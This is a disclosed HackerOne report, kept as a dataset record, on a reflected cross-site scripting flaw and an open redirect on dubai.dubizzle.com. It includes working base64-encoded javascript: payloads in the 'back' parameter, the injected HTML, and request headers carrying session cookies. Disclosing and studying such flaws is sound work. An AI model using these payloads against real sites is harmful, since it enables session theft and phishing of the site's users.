---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '177619'
original_report_id: '177619'
title: Reflective XSS at dubai.dubizzle.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-10-23T08:09:01.014Z'
disclosed_at: '2017-03-03T09:44:17.146Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflective XSS at dubai.dubizzle.com

## Metadata

- HackerOne Report ID: 177619
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2017-03-03T09:44:17.146Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

POC
===
1) Visit:
https://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=&from_search&highlighted_ads=1
2) Click on "Back" button in upper left hand corner

Attack
====
**URL Parameters**
back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=
from_search
highlighted_ads=1

The vulnerable url parameter is ```back``` 
Normally its contents is the base64 encoding of the referrer URL.
It is also possible to inject javascript.

Attack string is a base64 encoding of this payload
```
javascript://%0Aalert(document.domain)
```

Injection happens at line 480
```
<div id="header-left"><a id="back" class="button grey" href="javascript://%0Aalert(document.domain)/m">Back</a></div>
```

Resolution
=======
1) Remove use of url parameter for site navigation
2) Remove "amF2YXNjcmlwdA" (javascript) as acceptable in variable value
3) Remove colon

Etc
=====

Also possible to do open redirects (Note the domain change):
https://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=aHR0cDovL2JsYWNrZG9vcnNlYy5uZXQ=&from_search&highlighted_ads=1

IP during testing
68.69.254.107

**Request Headers**
```
GET /m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=&from_search&highlighted_ads=1 HTTP/1.1
Host: dubai.dubizzle.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: xtvrn=$509193$509856$; sid=yywt3todar28z1mz18092j353iyw97lc; default_site=2; csrftoken=beN0Jhf16oIKUrKg0YMoaja0hvMVmqYM; xtor=cs5-18006%5Bblog%5D-%5Bproperty%5D-%5Bq2_dubai_info%5D-%5Ben%5D-%5B09%252F08%252F2016%5D; xtdate=Fri%20Oct%2021%202016%2001%3A37%3A34%20GMT-0500%20%28Central%20Standard%20Time%29; xtide=%5B%5D; l=9239739; skybar_sess_True=4; skybar_preference_True=hide
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

I request that this ticket for public disclosure once it is fixed.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
